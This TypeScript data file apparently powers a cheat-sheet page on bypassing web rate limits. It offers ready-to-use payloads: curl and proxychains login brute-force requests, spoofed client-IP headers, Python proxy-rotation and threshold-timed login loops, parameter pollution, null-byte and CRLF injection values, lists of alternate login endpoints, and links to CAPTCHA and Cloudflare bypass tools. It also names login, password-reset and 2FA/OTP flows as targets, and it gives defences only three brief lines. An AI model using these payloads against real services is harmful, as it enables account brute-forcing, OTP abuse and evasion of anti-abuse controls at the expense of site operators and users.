export interface RateLimitCategory {
  category: string
  commands: { command: string; description: string }[]
}

export const lastUpdated = "2026-05-15"
export const pageDescription = "Rate limit bypass techniques using headers, IP rotation, race conditions, and caching."

export const rateLimitCategories: RateLimitCategory[] = [
  {
    category: "Introduction",
    commands: [
      { command: "Rate limiting controls how many requests a user can make within a period. Bypassing it enables brute-force attacks, DoS, and data scraping. This guide covers 15+ bypass techniques with tools and payloads.", description: "Common mechanisms: IP-based, Token Bucket, Leaky Bucket, Geographic/Region, User-based limits." },
    ],
  },
  {
    category: "IP Spoofing",
    commands: [
      { command: "proxychains curl -X POST https://target.com/login -d \"user=admin&pass=1234\"", description: "#1 Rotate IPs via proxychains — each request appears from a different source" },
      { command: "https://github.com/AeolusTF/BurpFakeIP", description: "#2 BurpFakeIP — Burp extension to spoof IP headers and bypass rate limits" },
      { command: "https://github.com/PortSwigger/ip-rotate", description: "#3 IP Rotate — PortSwigger extension for IP rotation in Burp" },
    ],
  },
  {
    category: "Changing User-Agent",
    commands: [
      { command: "Use Burp Intruder with a wordlist of User-Agent strings → Set User-Agent as payload position → Rotate on each request", description: "Rate limit systems often track by User-Agent. Rotating User-Agent makes each request appear from a different client." },
    ],
  },
  {
    category: "Header Manipulation — Spoof IP",
    commands: [
      { command: "X-Forwarded-For: 127.0.0.1", description: "Spoof client IP — often trusted by proxies and web apps" },
      { command: "X-Real-IP: 127.0.0.1", description: "Common in NGINX setups — can trick access controls" },
      { command: "X-Client-IP: 127.0.0.1", description: "Spoofs IP — sometimes logged or used for rate limiting" },
      { command: "CF-Connecting-IP: 127.0.0.1", description: "Cloudflare client IP header — some apps trust it directly" },
      { command: "Fastly-Client-IP: 127.0.0.1", description: "Fastly CDN client IP header" },
      { command: "X-Remote-IP: 127.0.0.1 | X-Remote-Addr: 127.0.0.1 | True-Client-IP: 127.0.0.1 | X-Cluster-Client-IP: 127.0.0.1", description: "Additional spoofable IP headers" },
      { command: "https://github.com/AeolusTF/BurpFakeIP", description: "BurpFakeIP — automate IP header spoofing in Burp" },
    ],
  },
  {
    category: "Proxy Rotation (Python)",
    commands: [
      { command: `import requests
proxies = [
    {"http": "http://proxy1.com:8080"},
    {"http": "http://proxy2.com:8080"},
    {"http": "http://proxy3.com:8080"}
]
for proxy in proxies:
    response = requests.get("https://example.com/api", proxies=proxy)
    print(response.status_code)`, description: "Rotate proxies in Python — each request uses a different proxy, bypassing IP-based rate limits" },
    ],
  },
  {
    category: "Different HTTP Methods",
    commands: [
      { command: "curl -X POST https://target.com/login -d \"user=admin&pass=1234\"", description: "#1 Try POST method" },
      { command: "curl -X GET \"https://target.com/login?user=admin&pass=1234\"", description: "#2 Try GET method — some rate limiters only track POST" },
      { command: "Try: PUT, DELETE, PATCH, OPTIONS, HEAD", description: "#3 Some rate limiters focus only on specific methods" },
    ],
  },
  {
    category: "Parameter Name Variation",
    commands: [
      { command: "username=admin&password=1234 | user=admin&pass=1234 | uname=admin&pwd=1234 | login=admin&passwd=1234 | u=admin&p=1234 | email=admin&key=1234 | id=admin&token=1234", description: "Different parameter names may bypass input filters and WAFs that track specific param names" },
    ],
  },
  {
    category: "Parameter Pollution",
    commands: [
      { command: "POST /login HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nuser=admin&user=admin2&pass=1234", description: "Duplicate parameters confuse rate-limiting mechanisms — server may process only one or both" },
    ],
  },
  {
    category: "Alternate Endpoints",
    commands: [
      { command: "/login /user/login /account/login /api/login /api/v1/login /api/v2/login /mobile/login /auth/login /authenticate /session/create /customers/signin /users/auth /rest/v1/login", description: "Test all alternate endpoints — mobile/API endpoints often lack rate limiting applied to the web version" },
    ],
  },
  {
    category: "Encoding Tricks",
    commands: [
      { command: "user=admin%20 | user=admin%00 | user=%61%64%6d%69%6e | user=ad%6Din | user=%2561%2564%256d%2569%256e", description: "#1 Encoded payloads — spaces, null bytes, hex, partial encoding, double encoding" },
      { command: "Content-Type: application/json {\"user\":\"admin\"} vs Content-Type: application/x-www-form-urlencoded user=admin", description: "#2 Switch content types — parsers may behave differently" },
    ],
  },
  {
    category: "Time-Based Manipulation",
    commands: [
      { command: `import requests, time
for i in range(10):
    r = requests.post("https://target.com/login", data={"user":"admin","pass":"1234"})
    print(r.status_code)
    time.sleep(0.9)`, description: "Control request intervals — sleep just below the rate limit threshold to avoid triggering blocks" },
    ],
  },
  {
    category: "Special Character Injection",
    commands: [
      { command: "email=test@example.com%00 | email=test@example.com%0D%0AHeader:injected | email=test@example.com%20 | email=test@example.com%0A", description: "Null byte, CRLF header injection, trailing space, newline — bypass filters and exploit parser quirks" },
    ],
  },
  {
    category: "Case Sensitivity & Font Tricks",
    commands: [
      { command: "Email: Test@Example.com | test@example.com | TEST@example.com", description: "#1 Mixed case — some systems validate differently based on case" },
      { command: "t3st@3xample.com | te.st@example.com", description: "#2 Look-alike characters — '3' for 'e', dots, Unicode homoglyphs" },
    ],
  },
  {
    category: "Blank Characters & Zero-Width Spaces",
    commands: [
      { command: "email=\" test@example.com \" | email=test@example.com%20 | email=test@example.com%E2%80%8B | email=test@example.com%09 | email=test@example.com%0A", description: "Spaces, zero-width space, tab, newline — break input parsing and bypass filters" },
    ],
  },
  {
    category: "CAPTCHA Bypass Tools",
    commands: [
      { command: "https://github.com/sarperavci/GoogleRecaptchaBypass", description: "Automated Google reCAPTCHA bypass tool" },
      { command: "https://github.com/sarperavci/CloudflareBypassForScraping", description: "Cloudflare protection bypass for scraping" },
    ],
  },
  {
    category: "Real-World Endpoints to Test",
    commands: [
      { command: "Account registration/signup | Login/account lock | Forgot/reset password | 2FA/MFA/OTP | Messaging/comments/invites | Disabling 2FA/SMS | Resend OTP code", description: "Test rate limit bypass on: registration, login, password reset, 2FA/OTP, messaging, invites, QR codes, disabling 2FA, resend OTP" },
    ],
  },
  {
    category: "Defensive Measures",
    commands: [
      { command: "CAPTCHA — verify user is human", description: "#1 CAPTCHA blocks automated requests" },
      { command: "Anomaly detection — monitor traffic spikes", description: "#2 Detect unusual patterns in request frequency" },
      { command: "Advanced rate limiting — cookies, session tokens, JavaScript challenges", description: "#3 Rate limit based on multiple signals, not just IP" },
    ],
  },
  {
    category: "Conclusion",
    commands: [
      { command: "Rate limit bypass is about observation, creativity, and persistence. Understand the logic, test methodically, and adapt. When you hit a rate limit, see it as an invitation to hack smarter.", description: "Combine: IP rotation → header spoofing → proxy rotation → method/param variation → time-based evasion" },
    ],
  },
]

export const rateLimitTools = [
  { name: "BurpFakeIP", url: "https://github.com/AeolusTF/BurpFakeIP", description: "Burp extension for IP header spoofing to bypass rate limits" },
  { name: "IP Rotate (PortSwigger)", url: "https://github.com/PortSwigger/ip-rotate", description: "Official PortSwigger IP rotation extension for Burp" },
  { name: "Google reCAPTCHA Bypass", url: "https://github.com/sarperavci/GoogleRecaptchaBypass", description: "Automated reCAPTCHA bypass tool" },
  { name: "Cloudflare Bypass", url: "https://github.com/sarperavci/CloudflareBypassForScraping", description: "Cloudflare protection bypass for web scraping" },
]
